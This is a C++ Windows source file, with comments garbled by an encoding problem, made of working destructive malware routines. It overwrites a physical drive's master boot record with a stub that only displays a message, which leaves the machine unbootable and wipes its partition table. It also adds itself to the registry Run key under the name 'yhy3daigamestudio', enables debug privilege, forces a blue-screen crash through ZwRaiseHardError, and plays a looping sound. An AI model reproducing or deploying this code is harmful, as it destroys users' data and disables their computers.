#include"std.h"

using namespace std;
//�Զ���MBR





void GetPrivileges()
{
	//����һ��PLUID
	HANDLE hProcess;
	HANDLE hTokenHandle;
	TOKEN_PRIVILEGES tp;
	hProcess = GetCurrentProcess();//��ȡ��ǰ���̵ľ��

	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
	//�����鿴ϵͳȨ�޵���Ȩֵ��������Ϣ��һ��LUID�ṹ���
	tp.PrivilegeCount = 1;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
	CloseHandle(hTokenHandle);
	CloseHandle(hProcess);

}

//дMBR
bool WritePhydriveMBR(unsigned int id,string msgstr)
{
	#pragma warning(push)
	#pragma warning (disable:4309 4838)
	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*�ַ�λ��*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
	#pragma warning(pop)
	static bool isfirstuse=true;
	if (isfirstuse)//
	{
		//��ʼ��MBR
		
		//��MBR���ַ�λ��
		pMBR[9] = static_cast<char>(msgstr.size());
		//��ѭ���߼����������������ã�������Win9x����Ч��������
		//pMBR[0x1BF] = 0x00;
		//pMBR[0x1C2] = 0x05;
		//�ӽ�β
		pMBR[510] = static_cast<char>(0x55);
		pMBR[511] = static_cast<char>(0xAA);
		//����ʾ�ַ�д��MBR
		strcpy_s(reinterpret_cast<char *>(pMBR + 24), 512, msgstr.c_str());
	}

	//����Ӳ���ļ�����
	wstringstream wss;
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//��
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//��readfile����ȡMBR
	bool retn = WriteFile(hFile, pMBR, 512, NULL, NULL) == TRUE;
	CloseHandle(hFile);
	return retn;
}

//��MBR
string ReadPhydriveMBR(unsigned int id)
{
	
	char pMBR[512] = {};
	wstringstream wss;
	//����Ӳ���ļ�����
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//��
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//��readfile����ȡMBR
	DWORD dwReadSize;
	
	bool r_flag = ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE;
	CloseHandle(hFile);
	if (r_flag)
		return static_cast<string>(pMBR);
	else
		return static_cast<string>("");
}


//ע��������
void RegAutoStart()
{
	HKEY hKey;
	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	//1���ҵ�ϵͳ��������  
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///��������       
	{
		//2���õ�������������ȫ·��
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3���ж�ע������Ƿ��Ѿ�����
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, nullptr, _T("yhy3daigamestudio"), RRF_RT_REG_SZ, 0, strDir, &nLength);
		//4���Ѿ�����
		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
		{
			//5������һ����Key,������ֵ
			RegSetValueEx(hKey, _T("yhy3daigamestudio"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR));
			//6���ر�ע���
			RegCloseKey(hKey);
		}
	}
}

//��������
void MakeBlueScreen(unsigned int errid)
{
	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
	if (ntdll != NULL)
	{
		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//��ȡ��������
		unsigned char ErrKill;
		long unsigned int HDErr;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
	}

}


void PlaySoundFile(wstring soundname,bool sync)
{
	PlaySound(soundname.c_str(), NULL, SND_FILENAME | (sync? SND_SYNC :SND_ASYNC) | SND_LOOP);
}